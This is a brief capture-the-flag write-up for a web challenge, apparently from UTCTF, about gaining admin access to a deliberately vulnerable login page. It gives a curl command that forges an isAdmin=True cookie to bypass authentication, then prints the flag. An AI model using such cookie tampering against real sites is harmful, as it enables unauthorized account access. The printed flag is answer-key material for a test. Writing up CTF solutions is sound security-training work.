#### Challenge:

HQ needs you to help them gain admin access to the Web D-EVIL-opers' site. We think the developers were a bunch of lazy bozos and just set the username and password to 'admin' but that doesn't seem to work. Can you see if we're missing anything?

_FYI, you do *not* need to do the `Login as Admin` sequence in order, and later parts are not necessarily harder than earlier ones._

[app.py](./app.py ":ignore") `http://web1.utctf.live:2361`

---

#### Solution:

- just change isAdmin cookie to `True`

```bash
curl 'http://web1.utctf.live:2361/' -H 'Cookie: isAdmin=True' --data-raw 'username=admin&pwd=admin'
```

---

<details><summary>FLAG:</summary>

```
utflag{t1m3_2_upd8_th@t_l@me_pwd}
```

</details>
<br/>
